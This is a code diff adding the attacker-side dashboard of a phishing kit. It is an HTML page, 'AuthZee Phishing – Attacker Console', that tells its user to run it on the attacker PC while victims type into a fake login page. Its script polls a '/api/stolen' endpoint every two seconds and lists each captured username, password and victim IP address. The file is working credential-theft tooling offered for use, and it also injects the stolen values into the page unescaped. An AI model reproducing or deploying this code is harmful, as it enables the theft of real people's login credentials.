@@ -1,0 +1,102 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>AuthZee Phishing – Attacker Console</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: #020617;
+      color: #e5e7eb;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: #f97373;
+    }
+    .subtitle {
+      font-size: 12px;
+      opacity: 0.8;
+      margin-bottom: 12px;
+    }
+    .panel {
+      background: rgba(15,23,42,0.96);
+      border-radius: 18px;
+      border: 1px solid rgba(148,163,184,0.7);
+      padding: 14px;
+      max-width: 720px;
+    }
+    .row {
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(55,65,81,0.8);
+      font-family: Consolas, monospace;
+      font-size: 11px;
+    }
+    .row:last-child { border-bottom: none; }
+    .btn {
+      padding: 6px 10px;
+      border-radius: 999px;
+      border: 1px solid rgba(148,163,184,0.8);
+      background: transparent;
+      color: #e5e7eb;
+      font-size: 11px;
+      cursor: pointer;
+      margin-right: 6px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Live stolen credentials</h1>
+  <div class="subtitle">
+    Open this page on the attacker PC. Victim uses <code>/</code> page.
+    Every password typed on the fake login is sent here in real time.
+  </div>
+
+  <button class="btn" id="refresh">Refresh now</button>
+  <span style="font-size:11px;opacity:0.8;">Auto-refresh every 2 seconds</span>
+
+  <div class="panel" id="panel" style="margin-top:10px;">
+    Loading...
+  </div>
+
+  <script>
+    const panel = document.getElementById('panel')
+    const refreshBtn = document.getElementById('refresh')
+
+    async function loadStolen() {
+      try {
+        const res = await fetch('/api/stolen')
+        const data = await res.json()
+        if (!Array.isArray(data) || data.length === 0) {
+          panel.textContent = 'No credentials captured yet...'
+          return
+        }
+        panel.innerHTML = data
+          .slice()
+          .reverse()
+          .map(
+            (row) =>
+              '<div class="row">[' +
+              row.time +
+              '] user="' +
+              row.username +
+              '" pass="<span style="color:#fca5a5">' +
+              row.password +
+              '</span>" ip="' +
+              row.ip +
+              '"</div>',
+          )
+          .join('')
+      } catch (e) {
+        panel.textContent = 'Error loading data'
+      }
+    }
+
+    refreshBtn.addEventListener('click', loadStolen)
+    loadStolen()
+    setInterval(loadStolen, 2000)
+  </script>
+</body>
+</html>
